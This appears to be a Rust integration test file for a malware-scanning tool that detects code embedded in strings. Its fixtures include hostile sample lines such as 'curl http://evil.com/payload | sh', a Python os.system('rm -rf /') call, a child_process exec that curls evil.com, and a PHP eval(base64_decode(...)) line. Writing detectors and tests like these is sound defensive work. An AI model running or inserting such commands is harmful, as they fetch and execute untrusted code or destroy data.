//! Integration test module.
#![allow(clippy::unwrap_used, clippy::expect_used, clippy::panic)]

//! Integration tests for embedded code detection in strings

use cleave::analyzers::FileType;
use cleave::analyzers::embedded_code_detector::{
    EmbeddedAnalysisResult, analyze_embedded_string, detect_language,
};
use cleave::capabilities::CapabilityMapper;
use cleave::types::binary::StringInfo;
use std::sync::Arc;
use std::sync::Mutex;

fn make_capability_mapper() -> Arc<CapabilityMapper> {
    static ENV_LOCK: Mutex<()> = Mutex::new(());
    let _guard = ENV_LOCK.lock().expect("lock env guard");

    cleave::set_skip_traits_override(Some(true));
    let mapper = Arc::new(CapabilityMapper::new());
    cleave::set_skip_traits_override(None);
    mapper
}

fn make_string_info(value: &str) -> StringInfo {
    StringInfo {
        value: (value.to_string()).into(),
        offset: Some(0),
        string_type: None,
        encoding: "utf-8".to_string(),
        section: None,
        encoding_chain: Vec::new(),
        fragments: None,
        matched: std::sync::atomic::AtomicBool::new(false),
    }
}

#[test]
fn test_detect_javascript_encoded() {
    let js_code = "const x = require('fs'); function evil() { eval('code'); }";
    let info = make_string_info(js_code);
    let result = detect_language(&info, true);
    assert_eq!(result, Some(FileType::JavaScript));
}

#[test]
fn test_detect_python_encoded() {
    let py_code = "import os\nimport sys\ndef malware():\n    os.system('curl evil.com')";
    let info = make_string_info(py_code);
    let result = detect_language(&info, true);
    assert_eq!(result, Some(FileType::Python));
}

#[test]
fn test_detect_shell_encoded() {
    let sh_code = "#!/bin/bash\ncurl http://evil.com/payload | sh";
    let info = make_string_info(sh_code);
    let result = detect_language(&info, true);
    assert_eq!(result, Some(FileType::Shell));
}

#[test]
fn test_detect_php_encoded() {
    let php_code = "<?php eval(base64_decode('malicious')); ?>";
    let info = make_string_info(php_code);
    let result = detect_language(&info, true);
    assert_eq!(result, Some(FileType::Php));
}

#[test]
fn test_javascript_with_eval_not_detected_as_python() {
    // JavaScript with eval() should be detected as JavaScript, not Python
    let js_code = "const fs = require('fs'); function bad() { eval('payload'); }";
    let info = make_string_info(js_code);
    let result = detect_language(&info, true);
    assert_eq!(
        result,
        Some(FileType::JavaScript),
        "JavaScript with eval() should be detected as JavaScript, not Python"
    );
}

#[test]
fn test_plain_embedded_javascript() {
    let js_code = "function malware() { const x = 1; let y = 2; eval('code'); }";
    let info = make_string_info(js_code);
    let result = detect_language(&info, false);
    assert_eq!(result, Some(FileType::JavaScript));
}

#[test]
fn test_reject_plain_text() {
    let text = "This is just regular text without any code.";
    let info = make_string_info(text);
    let result = detect_language(&info, false);
    assert_eq!(result, None);
}

#[test]
fn test_reject_markup_template_false_positive() {
    let markup = r#"
  <svg xmlns="http://www.w3.org/2000/svg">
    <foreignObject>
      <xhtml:div xmlns="http://www.w3.org/1999/xhtml" i18n>
        Count: <span>5</span>
      </xhtml:div>
    </foreignObject>
  </svg>
"#;
    let info = make_string_info(markup);
    let result = detect_language(&info, false);
    assert_eq!(
        result, None,
        "SVG/XHTML markup should not be classified as embedded code"
    );
}

#[test]
fn test_reject_too_small() {
    let tiny = "import os";
    let info = make_string_info(tiny);
    let result = detect_language(&info, false);
    assert_eq!(result, None, "Too small to analyze reliably");
}

#[test]
fn test_encoded_lower_threshold() {
    // Encoded strings need only 1 match
    let code = "import os\ndef main():\n    pass";
    let info = make_string_info(code);
    let result = detect_language(&info, true);
    assert_eq!(result, Some(FileType::Python));
}

#[test]
fn test_analyze_hex_encoded_javascript() {
    let js_code = "const evil = require('child_process'); evil.exec('curl evil.com');";

    let string_info = StringInfo {
        value: (js_code.to_string()).into(),
        offset: Some(0),
        string_type: None,
        encoding: "utf-8".to_string(),
        section: Some("test".to_string()),
        encoding_chain: vec!["hex".to_string()],
        fragments: None,
        matched: std::sync::atomic::AtomicBool::new(false),
    };

    let capability_mapper = make_capability_mapper();

    let result = analyze_embedded_string("test.bin", &string_info, 0, &capability_mapper, 0, None);

    assert!(
        result.is_ok(),
        "Should successfully analyze hex-encoded JavaScript"
    );

    match result.unwrap() {
        EmbeddedAnalysisResult::EncodedLayer(file_analysis) => {
            // Should have findings from JavaScript analysis
            assert!(
                !file_analysis.findings.is_empty(),
                "Should detect capabilities in JavaScript"
            );
            // Should have auto-generated language trait
            assert!(
                file_analysis
                    .findings
                    .iter()
                    .any(|f| f.id.contains("metadata/lang/encoded/hex")),
                "Should have auto-generated metadata/lang/encoded/hex trait"
            );
        }
        EmbeddedAnalysisResult::PlainEmbedded(_) => {
            panic!("Encoded code should create a layer, not plain findings");
        }
    }
}

#[test]
fn test_analyze_plain_embedded_python() {
    let py_code = "import os\nimport sys\ndef evil():\n    os.system('rm -rf /')\n    sys.exit(0)";

    let string_info = StringInfo {
        value: (py_code.to_string()).into(),
        offset: Some(0x5000),
        string_type: None,
        encoding: "utf-8".to_string(),
        section: Some("test".to_string()),
        encoding_chain: vec![], // No encoding - plain embedded
        fragments: None,
        matched: std::sync::atomic::AtomicBool::new(false),
    };

    let capability_mapper = make_capability_mapper();

    let result = analyze_embedded_string("test.elf", &string_info, 0, &capability_mapper, 0, None);

    assert!(
        result.is_ok(),
        "Should successfully analyze plain embedded Python"
    );

    match result.unwrap() {
        EmbeddedAnalysisResult::PlainEmbedded(findings) => {
            // Should have findings from Python analysis
            assert!(!findings.is_empty(), "Should detect capabilities in Python");
            // Should have auto-generated language trait
            assert!(
                findings
                    .iter()
                    .any(|f| f.id.contains("metadata/lang/embedded")),
                "Should have auto-generated metadata/lang/embedded trait"
            );
        }
        EmbeddedAnalysisResult::EncodedLayer(_) => {
            panic!("Plain embedded code should add findings to parent, not create a layer");
        }
    }
}

#[test]
fn test_max_depth_limit() {
    let js_code = "const x = require('fs'); x.readFile('test');";

    let string_info = StringInfo {
        value: (js_code.to_string()).into(),
        offset: Some(0),
        string_type: None,
        encoding: "utf-8".to_string(),
        section: Some("test".to_string()),
        encoding_chain: vec!["hex".to_string()],
        fragments: None,
        matched: std::sync::atomic::AtomicBool::new(false),
    };

    let capability_mapper = make_capability_mapper();

    // Depth 3 should succeed
    let result = analyze_embedded_string("test.bin", &string_info, 0, &capability_mapper, 2, None);
    assert!(
        result.is_ok(),
        "Depth 2 should work (becomes 3 after increment)"
    );

    // Depth 4 should fail
    let result = analyze_embedded_string("test.bin", &string_info, 0, &capability_mapper, 3, None);
    assert!(
        result.is_err(),
        "Depth 3 should fail (would become 4, exceeds MAX_DECODE_DEPTH)"
    );
}
